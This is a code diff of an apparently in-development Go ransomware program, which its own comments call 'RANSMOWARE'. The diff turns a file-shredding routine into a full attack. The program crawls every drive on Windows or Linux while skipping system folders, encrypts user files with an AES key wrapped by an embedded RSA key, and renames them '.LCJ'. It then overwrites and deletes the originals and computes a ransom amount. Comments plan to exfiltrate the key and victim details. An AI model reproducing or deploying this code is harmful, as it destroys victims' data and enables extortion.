@@ -1,14 +1,9 @@
-// Package shred is a golang library to mimic the functionality of the linux shred command
 package main
 
 // lisandro : delete all prints
 // lisandro : sc delete|stop <service> (in cmd, delete|stop the service)
 
-// lisandro : change the encryption swipe time from 3 to 2 ? (1?)
-
-// change the key var by another random string at the end of the program
-
-// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and a e-mail
+// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and an e-mail
 // and send with the message the encryption key
 
 import (
@@ -27,132 +22,184 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"reflect"
+	"runtime"
 	"strings"
+	"sync"
 	"time"
 )
 
-func init() {
-	//rand.Seed not working
-	//rand.Seed(time.Now().UnixNano())
+var key []byte
+var file_count int
+var MB150 int = 157286400
+var operating_system string
+var ext_blacklist = []string{
+	"LCJ",
+	"dll",
+	"exe",
+	"iso",
+	"img",
+	"msi",
+	"deb",
+	"ini",
+	"sys",
+	"json",
+	"msi",
+	"msu",
+	"mst",
+	"ini",
+	"img",
+	"xml",
+	"old", // lisandro : do i keep this ?
+	"386",
+	"adv",
+	"ani",
+	"bat",
+	"bin",
+	"cab",
+	"cmd",
+	"com",
+	"cpl",
+	"cur",
+	"deskthemepack",
+	"diagcab",
+	"diagcfg",
+	"diagpkg",
+	"drv",
+	"hlp",
+	"icl",
+	"icns",
+	"ico",
+	"ics",
+	"idx",
+	"ldf",
+	"lnk",
+	"mod",
+	"mpa",
+	"msc",
+	"msp",
+	"msstyles",
+	"nls",
+	"nomedia",
+	"ocx",
+	"prf",
+	"ps1",
+	"rom",
+	"rtp",
+	"scr",
+	"shs",
+	"spl",
+	"theme",
+	"themepack",
+	"wpx",
+	"lock",
+	"key",
+	"hta",
+	"pdb",
+
+}
+var WINDOWS_ff_blacklist = []string{
+	"bootmgr",
+	//"BOOTNXT",
+	"Documents and Settings",
+	"DumpStack.log",
+	"DumpStack.log.tmp",
+	"Program Files",
+	"Program Files (x86)",
+	"ProgramData",
+	"Windows",
+	"System Volume Information",
+	"lost+found",
+	"Autodesk",
+}
+var LINUX_ff_blacklist = []string{
+	"bin",
+	"boot",
+	".cache",
+	"dev",
+	"etc",
+	"initrd.img",
+	"lib",
+	"lib32",
+	"lib64",
+	"libx32",
+	"lost+found",
+	"media",
+	"opt",
+	"proc",
+	"run",
+	"sbin",
+	"srv",
+	"sys",
+	"tmp",
+	"usr",
+	"var",
+	"vmlinuz",
 }
 
-// ========= GENERAL =========
+var wg sync.WaitGroup
+var total_files_opened int64 // edode : MB value
+
+func init() {
+	operating_system = detect_os()
+}
+
+func detect_os()(string){
+	operating_sys := runtime.GOOS
+	switch operating_sys {
+	case "windows":
+		return "windows"
+	case "darwin":
+		return "mac"
+	case "linux":
+		return "linux"
+	default:
+		return "windows"
+	}
+}
+
 func Error(err error) (error){
 	if err != nil{
 		return err
 	}
 	return nil
 }
-// ========= END GENERAL =========
-// ========= SHRED =========
 
-// Conf is a object containing all choices of the user
-type Conf struct {
-	Times  int
-	Zeros  bool
-	Remove bool
-}
-
-// Path shreds all files in the location of path
-// recursively. If remove is set to true files will be deleted
-// after shredding. When a file is shredded its content
-// is NOT recoverable so USE WITH CAUTION!!!
-
-func (conf Conf) Path(path string) error {
-	stats, err := os.Stat(path)
-	Error(err)
-
-	if stats.IsDir() {
-		return conf.Dir(path)
-	}
-
-	return conf.File(path)
-}
-
-// Dir overwrites every File in the location of path and everything in its subdirectories
-func (conf Conf) Dir(path string) error {
-	var chErrors []chan error
-
-	walkFn := func(path string, info os.FileInfo, err error) error {
-		Error(err)
-
-		if info.IsDir() {
-			return nil
-		}
-
-		chErr := make(chan error)
-		chErrors = append(chErrors, chErr)
-		go func() {
-			err := conf.File(path)
-			chErr <- err
-		}()
-
-		return nil
-	}
-
-	if err := filepath.Walk(path, walkFn); err != nil {
-		return err
-	}
-
-	for _, chErr := range chErrors {
-		if err := <-chErr; err != nil {
-			return err
-		}
-	}
-
-	return nil
-}
-
-// File overwrites a given File in the location of path
-func (conf Conf) File(path string) error {
-	for i := 0; i < conf.Times; i++ {
-		if err := overwriteFile(path, true); err != nil {
-			return err
-		}
-	}
-
-	if conf.Zeros {
-		if err := overwriteFile(path, false); err != nil {
-			return err
-		}
-	}
-
-	if conf.Remove {
-		var err = os.Remove(path)
-		if err!=nil { return err }
-	}
-
-	return nil
-}
-
-func overwriteFile(path string, random bool) error {
+func overwrite_remove(path string) (error) { // lisandro : do not encrypt file if it's above 950MB
 	f, err := os.OpenFile(path, os.O_WRONLY, 0)
 	if err != nil {
 		return err
 	}
-
+	// overwriting with random values
 	defer f.Close()
 
 	info, err := f.Stat()
 	Error(err)
+	file_size := info.Size()
 
-	buff := make([]byte, info.Size())
-	if random {
-		if _, err := rand.Read(buff); err != nil {
-			return err
-		}
+	total_files_opened = total_files_opened + file_size
+
+	if total_files_opened >= 943718400{
+		wg.Wait()
 	}
 
+	buff := make([]byte, file_size)
+	if _, err := rand.Read(buff); err != nil {
+		return err
+	}
 	_, err = f.WriteAt(buff, 0)
-	return err
+	if err != nil{
+		return err
+	}
+
+	total_files_opened = total_files_opened - file_size
+	if total_files_opened <= 0 {
+		total_files_opened = 0
+	}
+	return nil
 }
 
-// ========= END SHRED =========
-
 // ========= ENCRYPT =========
-var key []byte
-/////////////////////
-
 func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
 	var public_key string
 
@@ -176,7 +223,7 @@ func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
 }
 
 func encrypt_encryption_key(k []byte) []byte {
-	public_key, _  := ParseRsaPublicKeyFromPemStr()
+	public_key, _  		:= ParseRsaPublicKeyFromPemStr()
 	encryptedBytes, err := rsa.EncryptOAEP(
 		sha256.New(),
 		rand.Reader,
@@ -205,13 +252,13 @@ func create_encryption_key() []byte {
 	encrypted_new_key :=  encrypt_encryption_key(new_key)
 	err := ioutil.WriteFile("key", encrypted_new_key, 0644)
 	if err != nil {
-		fmt.Printf("Error creating Key file!")
+		//fmt.Printf("Error creating Key file!")
 		os.Exit(0)
 	}
 	return new_key
 }
 
-func check_key() {
+func encryption_key() {
 	the_key, err := ioutil.ReadFile("key") //Check to see if a key was already created
 	if err != nil {
 		key = create_encryption_key() //If not, create one
@@ -220,70 +267,200 @@ func check_key() {
 	}
 }
 
-/////////////////////
-
-
-func encryptFile(inputfile string, outputfile string) {
+func encrypt_file(inputfile string, outputfile string) {
+	if inputfile == "/root/y/libcef.so"{
+		pass()
+	}
 	b, err := ioutil.ReadFile(inputfile) //Read the target file
 	Error(err)
 	ciphertext := encrypt(key, b)
-	//fmt.Printf("%x\n", ciphertext)
 	err = ioutil.WriteFile(outputfile, ciphertext, 0644)
 	if err != nil {
-		fmt.Printf("Unable to create encrypted file!\n")
+		//fmt.Printf("Unable to create encrypted file!\n")
 		os.Exit(0)
 	}
 }
-
 
 func encodeBase64(b []byte) []byte {
 	return []byte(base64.StdEncoding.EncodeToString(b))
 }
 
 func encrypt(key, text []byte) []byte {
+	var above_150MB bool = false
+	var not_ciphered_text, ciphered_text, encoded_string []byte
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		panic(err)
 	}
-	b := encodeBase64(text)
-	ciphertext := make([]byte, aes.BlockSize+len(b))
+
+	if len(text) > MB150 {
+		ciphered_text 	  = text[:10485760]
+		not_ciphered_text = text[10485760:]
+		encoded_string = encodeBase64(ciphered_text)
+		above_150MB = true
+	} else {
+		encoded_string = encodeBase64(text)
+	}
+
+	ciphertext := make([]byte, aes.BlockSize+len(encoded_string))
+
 	iv := ciphertext[:aes.BlockSize]
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
 		panic(err)
 	}
-	cfb := cipher.NewCFBEncrypter(block, iv)
-	cfb.XORKeyStream(ciphertext[aes.BlockSize:], b)
-	return ciphertext
-}
 
+	cfb := cipher.NewCFBEncrypter(block, iv)
+	cfb.XORKeyStream(ciphertext[aes.BlockSize:], encoded_string)
+
+	if above_150MB {
+		return append(ciphertext, not_ciphered_text...);
+	}
+	return ciphertext;
+}
 // ========= END ENCRYPT =========
 
-func listdir(path string)([]string){
-	searchDir := path
-	fileList := make([]string, 0)
-	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
-		fileList = append(fileList, path)
-		return err
-	})
+func is_in_blacklist(val interface{}, array interface{}) (bool) {
+	exists := false
 
-	if e != nil {
-		panic(e)
+	switch reflect.TypeOf(array).Kind() {
+	case reflect.Slice:
+		s := reflect.ValueOf(array)
+
+		for i := 0; i < s.Len(); i++ {
+			if reflect.DeepEqual(val, s.Index(i).Interface()) == true {
+				//index = i
+				exists = true
+				return exists//, index
+			}
+		}
+	}
+	return exists
+}
+
+func list_dir(path string)([]string){ // lisandro : check file extension here
+	searchDir := path
+	var fileList []string
+
+	if operating_system == "linux" {
+		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+			fileList = append(fileList, path)
+			return err
+		})
+		if e != nil {
+			panic(e)
+		}
+	}
+
+	if operating_system == "windows"{
+		var disk_drives string              // edode : C:; I:; E:;
+		var base_folder_and_childs []string // edode : base_folder_and_childs are folders like "Program Files/*"; "Windows/*"
+		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+			cut := strings.Split(path, "\\")
+			disk_drives = cut[0]
+			base_folder_and_childs = cut[1:]
+			base_folder := cut[1]
+			for _, ff := range(WINDOWS_ff_blacklist){
+				if strings.ToLower(base_folder) == strings.ToLower(ff){
+					return filepath.SkipDir
+				}
+			}
+			z := strings.Join(base_folder_and_childs, "\\")
+			disk_drives = disk_drives + "\\" + z
+			if !is_dir(disk_drives){
+				fileList = append(fileList, disk_drives)
+			}
+			return err
+		})
+
+		if e != nil {
+			panic(e)
+		}
 	}
 	return fileList
 }
 
-func remove_to_index(s []string, index int) ([]string) {
-	sub := make([]string, len(s))
-	copy(sub, s)
-	sub = append(sub[index:len(s)], s[len(s):]...)
-	return sub
+func list_root_dir(root string) ([]string) {
+	var files []string
+	fileInfo, err := ioutil.ReadDir(root)
+	if err != nil {
+		return files
+	}
+	for _, file := range fileInfo {
+		files = append(files, file.Name())
+	}
+	return files
+}
+
+func get_all_files()([]string){
+	var all_files 		 []string
+	var root_dirs 		 []string
+	var root_dirs_parsed []string
+
+	if operating_system == "linux"{
+		root_dirs = list_root_dir("/")
+		for _, dirs := range(root_dirs){
+			if !is_in_blacklist(dirs, LINUX_ff_blacklist){
+				if !is_dir(dirs){
+					if !is_symlink("/"+dirs){
+						if len(all_files) == 0 {
+							all_files = list_dir("/" + dirs)
+						} else {
+							temp := make([]string, len(all_files))
+							copy(temp, all_files)
+							all_files = list_dir("/" + dirs)
+							for _, file := range(temp){
+								all_files = append(all_files, file)
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	if operating_system == "windows"{
+		connected_drives := get_drives()
+		for _, drive := range(connected_drives){
+			temp := list_root_dir(drive + ":\\")
+			for _, files := range(temp){
+				root_dirs = append(root_dirs, drive + ":\\" + files)
+			}
+		}
+		for _, dirs := range(root_dirs){
+			if !is_in_blacklist(strings.Split(dirs, "\\")[1], WINDOWS_ff_blacklist){
+				root_dirs_parsed = append(root_dirs_parsed, dirs)
+			}
+		}
+		for _, dirs := range(root_dirs_parsed){
+			if is_dir(dirs){
+				temp := list_dir(dirs)
+				for _, files := range(temp){
+					all_files = append(all_files, files)
+				}
+			} else {
+				all_files = append(all_files, dirs)
+			}
+		}
+	}
+	return all_files
+}
+
+func get_drives() (r []string){
+	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ"{
+		f, err := os.Open(string(drive)+":\\")
+		if err == nil {
+			r = append(r, string(drive))
+			f.Close()
+		}
+	}
+	return
 }
 
 func is_dir(path string)(bool){
 	name := path
 	fi, err := os.Stat(name)
 	if err != nil {
-		fmt.Println(err)
 		return false
 	}
 	switch mode := fi.Mode(); {
@@ -295,112 +472,106 @@ func is_dir(path string)(bool){
 	return false
 }
 
-func file_to_byte(file string)(int64){
-	fi, err := os.Stat(file)
-	Error(err)
-	return fi.Size()
-}
-
-func byte_to_mega(file int64)(float64){
-	var file_size float64 = float64((file / 1024) / 1024)
-	return file_size
-}
-
-func is_windows(file string)(){
-	s := strings.Split(file, "/")
-	if (s[len(s)-1] == "Windows"){
-		fileList := listdir(file)
-		for _, f := range fileList {
-			s1 := strings.Split(f, "/")
-			if (s1[len(s)-1] == "System32"){ // 19111999 :
-
-			}
-		}
-	} else{
-		return;
+// lisandro : only works for linux -> add Windows support
+func is_symlink(file string)(bool) {
+	fi, err := os.Lstat(file)
+	if err != nil{
+		log.Fatal(err)
 	}
-	//fmt.Println(s[len(s)-1])
+	if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
+		return true
+	} else {
+		return false
+	}
+}
+
+
+func check_ext(file string) bool{
+	ext_split := strings.Split(file, ".")
+	file_ext  := ext_split[len(ext_split)-1:][0]
+	for _, ext := range ext_blacklist {
+		if file_ext == ext{
+			return true
+		}
+	}
+	return false
+}
+
+func ransom_amount(files_encrypted int) int{
+	return int(float32(files_encrypted) * 1.25)
 }
 
 func pass()(){
 	_ = ""
 }
 
-func tree(path string)(){
-	file_list := listdir(path)
+func listdir(path string)([]string){
+	searchDir := path
+	fileList := make([]string, 0)
+	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+		fileList = append(fileList, path)
+		return err	})
 
-	shredconf := Conf{Times: 2, Zeros: true, Remove: true}
+	if e != nil {
+		panic(e)
+	}
+	return fileList
+}
+
+func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 	start := time.Now()
-	for i := 1; i <= 3; i++ { // edode : 50 150 and the left ones
-		var max_size float64
-		for _, file := range file_list {
-			if file == "/root/y/PhpStorm-203.7717.64/plugins/yaml/lib/resources_en.jar"{
-				pass()
-			}
-			if file == "/root/y/PhpStorm-203.7717.64/plugins/yaml/lib/yaml.jar"{
-				pass()
-			}
-			var pa *[]string
-			pa = &file_list
-			fmt.Println("In for : ", &pa)
+	files := listdir("/root/y")
+	//files := get_all_files()
+	encryption_key()
 
-			if is_dir(file){
-				file_list = remove_to_index(file_list, 1)
-				continue
-			}
-			if file[len(file)-4:] == ".LCJ"{
-				continue
-			}
-
-			if i == 1 {
-				max_size = 50
-			} else if i == 2 {
-				max_size = 150
-			} else if i == 3  {
-				max_size = 9999999999
-			}
-
-			file_byte := file_to_byte(file)
-			size := byte_to_mega(file_byte)
-			if size <= max_size {
-				encryptFile(file, file+".LCJ")
-				shredconf.Path(file)
-				file_list = remove_to_index(file_list, 1)
-			} else {
-				continue
+	c := make(chan string, 100)
+	var fe int
+	for _, f := range(files){
+		if check_ext(f) || is_dir(f) || is_symlink(f){
+			continue
+		}
+		if runtime.NumGoroutine() == 50{
+			wg.Wait()
+		}
+		if len(c) > cap(c) - 50 { // lisandro : create func wipe chan
+			wg.Wait()
+			for {
+				if len(c) == 0{ break }
+				d := <- c
+				e := os.Remove(d)
+				if e!=nil { continue }
 			}
 		}
+		fe++
+		wg.Add(1)
+		go func (f string, c chan string) (){
+			defer wg.Done()
+			encrypt_file(f, f+".LCJ")
+			err := overwrite_remove(f)
+			if err != nil{
+				pass()
+			}
+			c <- f
+		}(f, c)
 	}
-	elapsed := time.Since(start)
-	log.Printf("SECOND ELAPSED : %s", elapsed)
+
+	wg.Wait()
+	if len(c) != 0{
+		for {
+			if len(c) == 0{ break }
+			d := <- c
+			e := os.Remove(d)
+			if e!=nil { continue }
+		}
+	}
+
+	fmt.Println("Files encrypted : ", fe, "Ransom amount : ", ransom_amount(fe))
+	log.Printf("SECOND ELAPSED : %s", time.Since(start))
 }
 
-func main() {
-	check_key()
-	path := "/root/y"
-	tree(path)
-	//tree(path, false)
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+/*
+edode : getting the memory address of variables :
+  var pa *[]string
+  pa = &file_tree
+  fmt.Println("In for : ", &pa)
+*/
